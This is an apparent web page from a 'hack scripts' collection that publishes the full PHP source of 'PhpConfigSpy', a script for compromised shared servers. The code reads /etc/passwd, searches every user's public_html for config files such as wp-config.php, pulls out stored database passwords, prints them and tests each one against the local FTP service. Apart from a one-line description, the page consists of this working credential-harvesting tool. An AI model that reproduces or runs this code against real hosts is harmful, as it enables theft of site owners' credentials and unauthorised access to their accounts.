<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> PhpConfigSpy </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>PhpConfigSpy</h2>
<p class="meta">10 Feb 2014</p>

<p>This script appears to try to obtain login details for a compromised server.</p>

<h2>PhpConfigSpy Source Code</h2>

<pre class="brush: php; title: ; notranslate" title="">&lt;?php 
echo "&lt;html&gt;"; 
echo "&lt;title&gt;PhpConfigSpy v0.1&lt;/title&gt;&lt;body&gt;"; 

set_time_limit(0); 
################## 
@$passwd=fopen('/etc/passwd','r'); 
if (!$passwd) { 
  echo "[-] Error : coudn't read /etc/passwd"; 
  exit; 
} 
$path_to_public=array(); 
$users=array(); 
$pathtoconf=array(); 
$i=0; 

while(!feof($passwd)) { 
$str=fgets($passwd); 
if ($i&gt;35) { 
   $pos=strpos($str,":"); 
   $username=substr($str,0,$pos); 
   $dirz="/home/$username/public_html/"; 
   if (($username!="")) { 
       if (is_readable($dirz)) { 
           array_push($users,$username); 
           array_push($path_to_public,$dirz); 
       } 
   } 
} 
$i++; 
} 
################### 

######################### 
echo "&lt;br&gt;&lt;br&gt;"; 
echo "&lt;textarea name='main_window' cols=100 rows=20&gt;"; 

echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"; 
echo "[+] Founded ".sizeof($path_to_public)." readable public_html directories\n"; 

echo "[~] Searching for passwords in config.* files...\n\n"; 
foreach ($users as $user) { 
       $path="/home/$user/public_html/"; 
       read_dir($path,$user); 
} 

echo "\n[+] Done\n"; 

function read_dir($path,$username) { 
   if ($handle = opendir($path)) { 
       while (false !== ($file = readdir($handle))) { 
             $fpath="$path$file"; 
             if (($file!='.') and ($file!='..')) { 
                if (is_readable($fpath)) { 
                   $dr="$fpath/"; 
                   if (is_dir($dr)) { 
                      read_dir($dr,$username); 
                   } 
                   else { 
                        if (($file=='config.php') or ($file=='config.inc.php') or ($file=='db.inc.php') or ($file=='connect.php') or ($file=='wp-config.php') or ($file=='var.php') or ($file=='configure.php') or ($file=='db.php') or ($file=='db_connect.php')) { 
                           $pass=get_pass($fpath); 
                           if ($pass!='') { 
                              echo "[+] $fpath\n$pass\n"; 
                              ftp_check($username,$pass); 
                           } 
                        } 
                   } 
                } 
             } 
       } 
   } 
} 

function get_pass($link) { 
   @$config=fopen($link,'r'); 
   while(!feof($config)) { 
       $line=fgets($config); 
       if (strstr($line,'pass') or strstr($line,'password') or strstr($line,'passwd')) { 
           if (strrpos($line,'"')) 
              $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,'"')-(strpos($line,'=')+3))); 
           else 
              $pass=substr($line,(strpos($line,'=')+3),(strrpos($line,"'")-(strpos($line,'=')+3))); 
           return $pass; 
       } 
   } 
} 

function ftp_check($login,$pass) { 
    @$ftp=ftp_connect('127.0.0.1'); 
    if ($ftp) { 
       @$res=ftp_login($ftp,$login,$pass); 
       if ($res) { 
          echo '[FTP] '.$login.':'.$pass."  Success\n"; 
       } 
       else ftp_quit($ftp); 
    } 
} 

echo "&lt;/textarea&gt;&lt;br&gt;"; 

echo "&lt;/body&gt;&lt;/html&gt;"; 
?&gt;
</pre>



        </section>

        <aside id="sidebar">
          <a href="/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
